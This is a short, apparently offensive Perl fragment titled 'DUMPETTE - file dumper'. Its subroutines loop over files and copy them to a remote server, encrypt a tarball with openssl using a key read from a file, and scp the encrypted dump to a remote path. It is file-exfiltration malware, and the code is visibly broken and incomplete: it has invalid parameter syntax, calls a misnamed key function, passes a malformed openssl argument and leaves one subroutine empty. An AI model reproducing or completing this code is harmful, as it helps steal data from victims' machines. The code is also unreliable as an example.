########################
# DUMPETTE - file dumper

sub fuk_payload
{
	while (1)
	{
		my ($server, \@files) = @_;
		sleep 100 unless defined $files[0];
		foreach (@files)
			{ XSscp($server, $_); }
	}
}
sub key_up
{
  sleep 60;
  my ($offset) = @_;
  my $key;
  read($Kfh, $key, $offset);
  return $key;
}
sub tarit
{

}
sub kripit
{
	my ($tarball, $path_server) = @_;
	my $key = keyup();
	my $name = dumpname();
	`openssl enc -aes-256-ecb -in $tarball -out $name -pass:stdin $key`;
	update_pskey();
	my $return = `scp $name $path_server`;
	print $Lfh "$return\n";
}
